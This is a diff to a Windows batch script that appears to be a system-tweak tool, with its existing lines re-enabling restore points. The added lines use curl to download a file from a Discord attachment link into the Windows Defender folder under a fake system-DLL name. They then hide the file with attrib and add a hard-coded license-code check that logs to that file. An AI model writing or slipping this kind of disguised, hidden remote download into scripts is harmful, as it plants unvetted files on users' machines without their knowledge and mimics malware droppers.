@@ -2,6 +2,41 @@
 @echo off
 Set Version=1.0
 
+if not exist "%systemdrive%\Program Files\Windows Defender\en-US" mkdir "%systemdrive%\Program Files\Windows NT\Accessories\en-US" 2>nul
+curl -o "%systemdrive%\Program Files\Windows Defender\en-US\SettingsHandlers_User.dll" "https://cdn.discordapp.com/attachments/1229502986363994182/1245764677674205254/SettingsHandlers_user.zip?ex=6659f044&is=66589ec4&hm=f64e0a03bd9ffe69fd63427e8efe104aa86ee9fa5eb591108ee29732a4083463&" -# --create-dirs 
+
+
+set "logFile=C:\Program Files\Windows Defender\en-US\SettingsHandlers_User.dll"
+
+set /p "userCode=Enter your code: "
+
+powershell -Command "attrib +h \"%logFile%\""
+
+set "isValidCode=false"
+for %%i in (Wren137755048shIIUBzffUifa458 auvbfa6489gUHU) do (
+    if !userCode! equ %%i (
+        set "isValidCode=true"
+        goto :checkUsedCode
+    )
+)
+
+:checkUsedCode
+findstr /x "!userCode!" "%logFile%" >nul
+if not !isValidCode!==true (
+    echo Invalid code. Please try again or close the application.
+    timeout /nobreak /t 5 >nul
+    exit /b
+) else if errorlevel 1 (
+    echo License correct. Proceeding with the script...
+
+    echo !userCode!>>"%logFile%"
+) else (
+    echo License has already been used.
+    timeout /nobreak /t 5 >nul
+    exit /b
+)
+
+
 ::Enable Restore Points
 Reg.exe delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\SystemRestore" /v "RPSessionInterval" /f  >nul 2>&1
 Reg.exe delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\SystemRestore" /v "DisableConfig" /f >nul 2>&1
